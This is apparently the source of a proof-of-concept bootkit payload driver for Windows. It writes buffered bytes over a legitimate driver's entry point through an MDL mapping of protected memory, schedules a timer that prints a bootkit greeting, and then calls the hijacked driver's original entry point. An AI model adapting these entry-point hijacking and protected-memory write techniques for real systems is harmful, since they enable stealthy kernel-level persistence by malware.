#include <ntddk.h>

__declspec(dllexport) volatile UCHAR MapperData[21] = { 0 };

KTIMER gTimer = { 0 };
KDPC gDpc = { 0 };

void LoopPrint(
    _In_ struct _KDPC* Dpc,
    _In_opt_ PVOID DeferredContext,
    _In_opt_ PVOID SystemArgument1,
    _In_opt_ PVOID SystemArgument2)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    KdPrint(("Hello from Bootkit via kernel\n"));
}

extern "C"
BOOLEAN MemCopyWP(UCHAR * dst, UCHAR * src, ULONG size)
{
    PMDL Mdl = NULL;
    PVOID Mapped = NULL;

    Mdl = IoAllocateMdl(dst, size, FALSE, FALSE, NULL);
    if (!Mdl)
    {
        return FALSE;
    }

    MmProbeAndLockPages(Mdl, KernelMode, IoModifyAccess);

    Mapped = MmMapLockedPagesSpecifyCache(Mdl, KernelMode, MmNonCached, NULL, 0, HighPagePriority);
    if (!Mapped)
    {
        MmUnlockPages(Mdl);
        IoFreeMdl(Mdl);
        return FALSE;
    }

    // memcpy(mapped, src, size);  // movups  xmmword ptr [rcx],xmm0
    for (unsigned int i = 0; i < size; i++)
    {
        *((UCHAR*)Mapped + i) = *(src + i);
    }

    MmUnmapLockedPages(Mapped, Mdl);
    MmUnlockPages(Mdl);
    IoFreeMdl(Mdl);

    return TRUE;
}

extern "C"
NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, PDRIVER_INITIALIZE EntryPointOfTargetModule)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    MemCopyWP((UCHAR*)EntryPointOfTargetModule, (UCHAR*)MapperData, sizeof(MapperData));

    KdPrint(("Call DriverEntry\n"));

    KeInitializeTimerEx(&gTimer, NotificationTimer);

    KeInitializeDpc(&gDpc, LoopPrint, NULL);

    LARGE_INTEGER Delay = { 0 };
    Delay.QuadPart = -10000000LL;  // -1•bi100ƒiƒm•b’PˆÊj
    KeSetTimerEx(&gTimer, Delay, 1000, &gDpc);

    return EntryPointOfTargetModule(DriverObject, RegistryPath);
}
